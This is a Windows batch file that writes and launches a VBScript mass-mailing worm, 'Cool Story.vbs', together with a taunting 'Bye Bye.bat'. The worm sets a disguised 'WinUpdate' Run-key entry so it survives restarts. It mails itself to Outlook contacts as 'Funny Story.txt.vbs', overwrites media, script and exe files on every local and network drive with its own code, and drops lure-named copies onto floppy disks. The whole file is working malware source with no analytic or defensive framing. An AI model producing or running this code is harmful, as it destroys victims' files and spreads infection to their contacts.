@echo off
cls
cd WINDOWS
echo On error resume next >> Cool Story.vbs
echo randomize >> Cool Story.vbs
echo set >> Cool Story.vbs
echo fso=createobject("scripting.filesystemobject") >> Cool Story.vbs
echo set wscriptshell=createobject("wscript.shell") >> Cool Story.vbs
echo set drives=fso.drives >> Cool Story.vbs
echo for each drive in drives >> Cool Story.vbs
echo if drive="C:" then >> Cool Story.vbs
echo if drive.isready then >> Cool Story.vbs
echo drivefull=drive & "\" >> Cool Story.vbs
echo set e5d=fso.getfolder(drivefull) >> Cool Story.vbs
echo set subs=e5d.subfolders >> Cool Story.vbs
echo for each subfolder in subs >> Cool Story.vbs
echo subst=mid(subfolder.path,4,3) >> Cool Story.vbs
echo if subst="WIN" then >> Cool Story.vbs
echo auto=subfolder.path >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo next >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo next >> Cool Story.vbs
echo autos=auto & "\run32dll.vbs" >> Cool Story.vbs
echo fso.copyfile wscript.scriptfullname,autos >> Cool Story.vbs
echo wscriptshell.regwrite echo "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" >> Cool Story.vbs
echo if wscript.scriptfullname <> autos then >> Cool Story.vbs
echo all="YEAH BABY, NEOGEN JUST GOT INTO YOUR COMPUTER" >> Cool Story.vbs
echo datafiln=auto&"\Funny Story.txt" >> Cool Story.vbs
echo set dat=fso.createtextfile(datafiln,true) >> Cool Story.vbs
echo dat.write all >> Cool Story.vbs
echo dat.close >> Cool Story.vbs
echo wscriptshell.run "notepad.exe" & " " & datafiln,3 >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo mailed=auto & "\Funny Story.txt.vbs" >> Cool Story.vbs
echo fso.copyfile wscript.scriptfullname,mailed >> Cool Story.vbs
echo if wscriptshell.regread("HKLM\SOFTWARE\Microsoft")<>"1" then >> Cool Story.vbs
echo set out=createobject("Outlook.Application") >> Cool Story.vbs
echo if out="Outlook" then  >> Cool Story.vbs
echo set mapi=out.GetNameSpace("MAPI") >> Cool Story.vbs
echo set newitem=mapi.getdefaultfolder(6) >> Cool Story.vbs
echo do while newitem.items.count<>1 >> Cool Story.vbs
echo for each item in newitem.items >> Cool Story.vbs
echo do while item.Attachments.count<>0 >> Cool Story.vbs
echo for each itatt in item.Attachments >> Cool Story.vbs
echo itatt.delete >> Cool Story.vbs
echo next >> Cool Story.vbs
echo loop >> Cool Story.vbs
echo item.subject="RE: Cool Story" >> Cool Story.vbs
echo item.Body="Hey, I found this really cool story, i think that you should check it out....." >> Cool Story.vbs
echo item.attachments.add mailed >> Cool Story.vbs
echo item.send >> Cool Story.vbs
echo next >> Cool Story.vbs
echo loop >> Cool Story.vbs
echo set item=Nothing >> Cool Story.vbs
echo set itatt=nothing >> Cool Story.vbs
echo set newitem=Nothing >> Cool Story.vbs
echo set newitem=mapi.getdefaultfolder(5) >> Cool Story.vbs
echo do while newitem.items.count<>1 >> Cool Story.vbs
echo for each item in newitem.items >> Cool Story.vbs
echo do while item.Attachments.count<>0 >> Cool Story.vbs
echo for each itatt in item.Attachments >> Cool Story.vbs
echo itatt.delete >> Cool Story.vbs
echo next >> Cool Story.vbs
echo loop >> Cool Story.vbs
echo item.subject="RE: Cool Story" >> Cool Story.vbs
echo item.Body="Hey, I found this really cool story, i think that you should check it out....." >> Cool Story.vbs
echo item.attachments.add mailed >> Cool Story.vbs
echo item.send >> Cool Story.vbs
echo next >> Cool Story.vbs
echo loop >> Cool Story.vbs
echo set item=Nothing >> Cool Story.vbs
echo set itatt=nothing >> Cool Story.vbs
echo set newitem=Nothing >> Cool Story.vbs
echo set out=Nothing >> Cool Story.vbs
echo wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft","1" >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo set dr=fso.Drives >> Cool Story.vbs
echo for each d in dr >> Cool Story.vbs
echo if d.DriveType=2 or d.DriveType=3 then >> Cool Story.vbs
echo list(d.path&"\") >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo next >> Cool Story.vbs
echo Sub spreadmailto (dir) >> Cool Story.vbs
echo on error resume next >> Cool Story.vbs
echo set fso=createobject("Scripting.filesystemobject") >> Cool Story.vbs
echo set f=fso.GetFolder(dir) >> Cool Story.vbs
echo set cf=f.Files >> Cool Story.vbs
echo for each fil in cf >> Cool Story.vbs
echo ext=fso.GetExtensionName(fil.path) >> Cool Story.vbs
echo ext=lcase(ext) >> Cool Story.vbs
echo if (ext="vbs") or (ext="vba") then >> Cool Story.vbs
echo fso.copyfile wscript.scriptfullname,fil.path >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo next >> Cool Story.vbs
echo End Sub >> Cool Story.vbs
echo Sub list(dir) >> Cool Story.vbs
echo on error resume next >> Cool Story.vbs
echo set f=fso.GetFolder(dir) >> Cool Story.vbs
echo set ssf=f.Subfolders >> Cool Story.vbs
echo for each fil in ssf >> Cool Story.vbs
echo spreadmailto(fil.path) >> Cool Story.vbs
echo list(fil.path) >> Cool Story.vbs
echo next >> Cool Story.vbs
echo End Sub >> Cool Story.vbs
echo payl=wscriptshell.regread("HKLM\SOFTWARE\TaskManager") >> Cool Story.vbs
echo if payl="" then  >> Cool Story.vbs
echo wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager","1" >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo if payl<> reboots then >> Cool Story.vbs
echo payl=payl+1 >> Cool Story.vbs
echo wscriptshell.regwrite "HKLM\SOFTWARE\TaskManager",payl >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo if payl= reboots then >> Cool Story.vbs
echo set dr=fso.Drives >> Cool Story.vbs
echo for each d in dr >> Cool Story.vbs
echo if d.DriveType=2 or d.DriveType=3 then >> Cool Story.vbs
echo listed(d.path&"\") >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo next >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo Sub spread (dir) >> Cool Story.vbs
echo on error resume next >> Cool Story.vbs
echo set fso=createobject("Scripting.filesystemobject") >> Cool Story.vbs
echo set f=fso.GetFolder(dir) >> Cool Story.vbs
echo set cf=f.Files >> Cool Story.vbs
echo for each fil in cf >> Cool Story.vbs
echo ext=fso.GetExtensionName(fil.path) >> Cool Story.vbs
echo ext=lcase(ext) >> Cool Story.vbs
echo if (ext="mp3") or (ext="jpg") or (ext="mpeg") or (ext="jpeg") or (ext="mpg")or (ext="exe") then >> Cool Story.vbs
echo fso.copyfile wscript.scriptfullname,fil.path >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo next >> Cool Story.vbs
echo End Sub >> Cool Story.vbs
echo Sub listed(dir) >> Cool Story.vbs
echo on error resume next >> Cool Story.vbs
echo set f=fso.GetFolder(dir) >> Cool Story.vbs
echo set ssf=f.Subfolders >> Cool Story.vbs
echo for each fil in ssf >> Cool Story.vbs
echo spread(fil.path) >> Cool Story.vbs
echo listed(fil.path) >> Cool Story.vbs
echo next >> Cool Story.vbs
echo End Sub >> Cool Story.vbs
echo payl=wscriptshell.regread("HKLM\SOFTWARE\Tasks") >> Cool Story.vbs
echo if payl="" then  >> Cool Story.vbs
echo wscriptshell.regwrite "HKLM\SOFTWARE\Tasks","1" >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo if payl<> reboots then >> Cool Story.vbs
echo payl=payl+1 >> Cool Story.vbs
echo wscriptshell.regwrite "HKLM\SOFTWARE\Tasks",payl >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo if payl=reboots then >> Cool Story.vbs
echo msgbox "Yeah baby, i'm still here" >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo tim=minute(time) >> Cool Story.vbs
echo tim=tim+6 >> Cool Story.vbs
echo set thiscode=fso.opentextfile(wscript.scriptfullname,1) >> Cool Story.vbs
echo code=thiscode.readall >> Cool Story.vbs
echo thiscode.close >> Cool Story.vbs
echo do >> Cool Story.vbs
echo if not (fso.fileexists(autos)) then >> Cool Story.vbs
echo set resur=fso.createtextfile(autos,true) >> Cool Story.vbs
echo resur.write code >> Cool Story.vbs
echo resur.close >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo regvalue=wscriptshell.regread("HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate") >> Cool Story.vbs
echo if regvalue <> "wscript.exe" & " " & autos & " " & "%"  then  >> Cool Story.vbs
echo wscriptshell.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinUpdate","wscript.exe" & " " & autos & " " & "%" >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo regvalue="" >> Cool Story.vbs
echo timstandard=minute(time) >> Cool Story.vbs
echo if tim>53 then >> Cool Story.vbs
echo tim=01 >> Cool Story.vbs
echo end if >> Cool Story.vbs
echo if timstandard=tim then >> Cool Story.vbs
echo tim=minute(time) >> Cool Story.vbs
echo tim=tim+6 >> Cool Story.vbs
echo trig=int((10*rnd)+1) >> Cool Story.vbs
echo select case trig >> Cool Story.vbs
echo case 1 >> Cool Story.vbs
echo floppya="a:\PIZZABOY.txt.vbs" >> Cool Story.vbs
echo case 2 >> Cool Story.vbs
echo floppya="a:\YOU-ARE-DOOMED.txt.vbs" >> Cool Story.vbs
echo case 3 >> Cool Story.vbs
echo floppya="a:\JESUS666.txt.vbs" >> Cool Story.vbs
echo case 4 >> Cool Story.vbs
echo floppya="a:\ANDRIANA-SKLENARIKOVA.JPG.vbs" >> Cool Story.vbs
echo case 5 >> Cool Story.vbs
echo floppya="a:\DE NIRO FUCKS NAOMI.JPG.vbs" >> Cool Story.vbs
echo case 6 >> Cool Story.vbs
echo floppya="a:\SPIDERMAN_LIVES.txt.vbs" >> Cool Story.vbs
echo case 7 >> Cool Story.vbs
echo floppya="a:\HACKING_WINDOWS.TXT.vbs" >> Cool Story.vbs
echo case 8 >> Cool Story.vbs
echo floppya="a:\EUROVISION_ORGY.JPG.vbs" >> Cool Story.vbs
echo case 9 >> Cool Story.vbs
echo floppya="a:\Sex_Advices.txt.vbs" >> Cool Story.vbs
echo case else >> Cool Story.vbs
echo floppya="a:\MELINDA'S EYES.JPG.vbs" >> Cool Story.vbs
echo end select >> Cool Story.vbs
echo set repla=fso.createtextfile(floppya,true) >> Cool Story.vbs
echo repla.write code >> Cool Story.vbs
echo repla.close >> Cool Story.vbs
echo set repla=nothing >> Cool Story.vbs
echo floppya="" >> Cool Story.vbs
echo loop >> Cool Story.vbs
echo @echo off >> Bye Bye.bat
echo cls  >> Bye Bye.bat
echo echo Bye Bye  >> Bye Bye.bat
echo pause >> Bye Bye.bat
echo Prepare to see your computer get destroyed!!! >> Bye Bye.bat
echo pause  >> Bye Bye.bat
echo exit >> Bye Bye.bat
start Bye Bye.bat
start Cool Story.vbs
exit